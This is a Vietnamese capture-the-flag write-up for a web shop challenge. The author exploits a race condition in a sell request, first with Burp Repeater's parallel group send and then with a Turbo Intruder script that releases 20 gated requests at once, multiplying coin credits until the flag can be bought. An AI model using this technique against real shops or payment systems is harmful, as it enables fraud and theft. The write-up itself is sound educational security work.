# Giới thiệu
- Link: [Có thể bị xoá sau này](http://152.67.127.64:8013/)
- Mô tả: Đơn giản là mua flag thôi

# Chợ bến thành
- Nhìn qua cái webpage thì tôi nghĩ ngay đến việc dùng race condition, đại khái là bạn sẽ gửi nhiều cùng một request nhiều lần trong một thòi điểm nhất định

![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/4796164f-16e4-482c-aa78-e32af7a1ce4f)
- Ta mua một item rồi, rồi chuyển sell request sang repeater. Sau đó tạo một group, và copy khoảng vài chục cái request khác để add vào group, tôi sẽ để khoảng 20 request 

![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/ab7aeca6-6eab-410a-9fbf-3b673c44af19)
- Ở nút send có một mũi tên xuống, có 3 lựa chọn ở đây, tôi sẽ chọn ```send group in parallel``` (gửi song song) và kết quả là

![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/b659d196-6af6-4280-9c44-504aef32b902)
- Có vẻ nó không hoạt động, thực ra tôi cũng đã đoán trước rồi :|| vì cách này không có hiệu quả với HTTP/1
- Ta vẫn còn một con đường khác là dùng một extension của Burp là Turbo Intruder, tôi sẽ dùng scripts như sau

      def queueRequests(target, wordlists):
      
          # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
          # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
          # for more information, check out https://portswigger.net/research/smashing-the-state-machine
          engine = RequestEngine(endpoint=target.endpoint,
                                 concurrentConnections=20,
                                 engine=Engine.THREADED
                                 )
      
          # the 'gate' argument withholds part of each request until openGate is invoked
          # if you see a negative timestamp, the server responded before the request was complete
          for i in range(20):
              engine.queue(target.req, gate='1')
      
          # once every 'race1' tagged request has been queued
          # invoke engine.openGate() to send them in sync
          engine.openGate('1')
      
      
      def handleResponse(req, interesting):
          table.add(req)
![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/e1293b8e-de9e-4617-adc0-f16ea9630738)
- Giờ chọn Attack và xem kết quả thôi

![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/a5457aab-6cb6-4188-9ed0-acfdb7317f00)
- Ok thì response trả về mỗi cái một kiểu nên chúng ta thử ra check ở web nhé ![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/4837d453-bfc4-44ca-942f-f8d3d6333b15)
- Thế là ta đã có đủ tiền mua flag rồi (thực tế nếu race condition thành công mĩ mãn thì đánh lẽ ta có thể thu được lên tới 20 lần số coin bán đi, nhưng ở đây như này đã là quá đủ rồi)
- Giờ mua flag rồi bán đi thì ta sẽ có flag ![image](https://github.com/Myozz/CTF_WriteUp/assets/94811005/a2b6e63c-4d4c-49e3-8f1c-1fc5065578f8)
